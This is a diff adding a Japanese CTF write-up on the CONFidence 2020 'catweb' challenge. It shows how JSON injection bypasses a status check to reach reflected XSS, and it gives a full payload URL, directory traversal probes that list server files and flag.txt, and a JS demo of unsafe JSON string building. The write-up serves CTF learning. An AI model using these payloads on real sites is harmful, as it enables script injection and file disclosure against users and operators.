@@ -47,6 +47,164 @@
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 # writeup
 
+
+## Reflect / JSON Injection (CONFidence 2020 Teaser)
+https://www.gem-love.com/ctf/2019.html   
+- **entrypoint**   
+http://catweb.zajebistyc.tf/   
+ここでまだ動いてる。   
+`<script>`タグ内で`newDiv.innerHTML = '<img style="max-width: 200px; max-height: 200px" src="static/'+kind+'/'+cat+'" />';`としてJSONで返ってきたデータをimgタグ内に挿入している。ここでReflect XSSできる！   
+ちなみに、Directry Traversalもできる！   
+- **概要**   
+以下の通り、`/cats?kind=black`とかでリクエストを送信すると、JSONデータが返ってきてそれを`<img>`タグ内に挿入している。   
+```html
+<html>
+	<head>
+		<title>My cats</title>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+	<script>
+		function getNewCats(kind) {
+			$.getJSON('http://catweb.zajebistyc.tf/cats?kind='+kind, function(data) {
+				if(data.status != 'ok')
+				{
+					return;
+				}
+				$('#cats_container').empty();
+				cats = data.content;
+				cats.forEach(function(cat) {
+					var newDiv = document.createElement('div');
+					newDiv.innerHTML = '<img style="max-width: 200px; max-height: 200px" src="static/'+kind+'/'+cat+'" />';
+					$('#cats_container').append(newDiv);
+				});
+			});
+
+		}
+		$(document).ready(function() {
+			$('#cat_select').change(function() {
+				var kind = $(this).val();
+				history.pushState({}, '', '?'+kind)
+				getNewCats(kind);
+			});
+			var kind = window.location.search.substring(1);
+			if(kind == "")
+			{
+				kind = 'black';
+			}
+			getNewCats(kind);
+		});
+	</script>
+	</head>
+	<body>
+		<select id="cat_select">
+			<option value="black">black</option>
+			<option value="grey">grey</option>
+			<option value="red">red</option>
+			<option value="white">white</option>
+		</select>
+		<div id="cats_container"></div>
+		not like sumthing? send it <a href="/report">hier</a>
+	</body>
+</html>
+```
+返ってくるJSONは以下の通り。   
+```txt
+{
+"status": "ok",
+"content": ["2468b5d0-67e8-4d77-9bbb-87a656c8087a-large3x4_Untitledcollage.jpg", "24.jpg", "il_570xN.1285759626_8j8m.jpg"]
+}
+```
+これを取得して以下のようなHTMLをJavascriptで生成する。   
+なので、`kind`,`cat`のいずれかで`onerror=alert(1);`みたいな感じでやりたい。   
+```html
+<div id="cats_container">
+	<div>
+		<img style="max-width: 200px; max-height: 200px" src="static/black/2468b5d0-67e8-4d77-9bbb-87a656c8087a-large3x4_Untitledcollage.jpg">
+	</div>
+```
+しかし、`kind=black`のかわりに`black=aaa`みたいな存在しないっぽいものを投げるとJSONでstats errorとなって、`<img>`を挿入せずに`return`してしまう。   
+```txt
+cats?kind="/>';alert(1);//"
+{"status": "error", "content": ""/>';alert(1);//" could not be found"}
+```
+ここで、入力がJSONの中に入っているので、JSON Injectionによって`"status":"OK"`をあらかじめ入れておくことでstatusのチェックをバイパスする。   
+```txt
+// これを投げる。
+kind=", "status": "ok", "content": ["1554866661126960529.jpg", "lJCNA_JC_400x400.jpg", "1.jpg", "1548178639131425422.jpg"], "test":"
+
+// これはいかのようになり、status=okで上書きされるので結果はerrorではなくOKとなる！
+{"status": "error", "content": "", "status": "ok", "content": ["1554866661126960529.jpg", "lJCNA_JC_400x400.jpg", "1.jpg", "1548178639131425422.jpg"], "test":" could not be found"}
+```
+次は`onerror=alert`とかを挿入したい。`<img src=".....aa" onerror="alert(1);">`のようにしたいので以下を送信するとJSONの構文が壊れてエラーとなる。   
+```txt
+//　これを送信
+", "status": "ok", "content": ["y1ng" onerror="alert('y1ng')"], "test":"
+
+// SyntaxError: JSON.parse: expected ',' or ']' after array element at line 1 column 71 of the JSON data
+{"status": "error", "content": "", "status": "ok", "content": ["y1ng" onerror="alert('y1ng')"], "test":" could not be found"}
+```
+なので、"\"をダブルクオートの前に挿入してやればよい。   
+```txt
+", "status": "ok", "content": ["y1ng\" onerror=\"alert('y1ng')"], "test":"
+
+{"status": "error", "content": "", "status": "ok", "content": ["y1ng\" onerror=\"alert('y1ng')"], "test":" could not be found"}
+```
+これで以下のようにHTMLが生成され、XSSが達成できる！   
+```html
+<img style="max-width: 200px; max-height: 200px" src="static/%22,%20%22status%22:%20%22ok%22,%20%22content%22:%20[%22y1ng\%22%20onerror=\%22alert(%27y1ng%27)%22],%20%22test%22:%22/y1ng" onerror="alert('y1ng')">
+```
+- **Payload**   
+```txt
+http://catweb.zajebistyc.tf/?%22,%20%22status%22:%20%22ok%22,%20%22content%22:%20[%22y1ng\%22%20onerror=\%22alert(%27y1ng%27)%22],%20%22test%22:%22
+```
+また、実は以下でDirectry Traversalができる。つまり、`kind=black`のblackはディレクトリ名だった！   
+```txt
+kind=.
+{"status": "ok", "content": ["grey", "black", "white", "red"]}
+
+kind=../
+{"status": "ok", "content": ["uwsgi.ini", "prestart.sh", "main.py", "templates", "static", "app.py"]}
+
+kind=../templates/
+{"status": "ok", "content": ["index.html", "report.html", "flag.txt"]}
+```
+- **JSON Injection**   
+```js
+// この実装は脆弱！key1の値を上書きできる！
+dataStr = "value2', 'key1':'fake_value1";
+jsonStr = "{'key1':'value1', 'key2':'" + dataStr + "'}";
+console.log(jsonStr);  // {'key1':'value1', 'key2':'value2', 'key1':'fake_value1'}
+
+// こっちだとsecure???
+dataStr = "'value2', key1:'fake_value1'";
+temp_obj = {'key1':'value1', 'key2': dataStr};
+console.log(temp_obj); // { key1: 'value1', key2: "'value2', key1:'fake_value1'" }
+jsonStr = JSON.stringify(temp_obj);
+console.log(jsonStr);  // {"key1":"value1","key2":"'value2', key1:'fake_value1'"}
+```
+## 
+- **entrypoint**   
+- **概要**   
+- **Payload**   
+## 
+- **entrypoint**   
+- **概要**   
+- **Payload**   
+## 
+- **entrypoint**   
+- **概要**   
+- **Payload**   
+## 
+- **entrypoint**   
+- **概要**   
+- **Payload**   
+## 
+- **entrypoint**   
+- **概要**   
+- **Payload**   
+## 
+- **entrypoint**   
+- **概要**   
+- **Payload**   
 # Docker環境があるやつ
 ## somen (SECCON beginners 2020)
 https://github.com/SECCON/Beginners_CTF_2020  
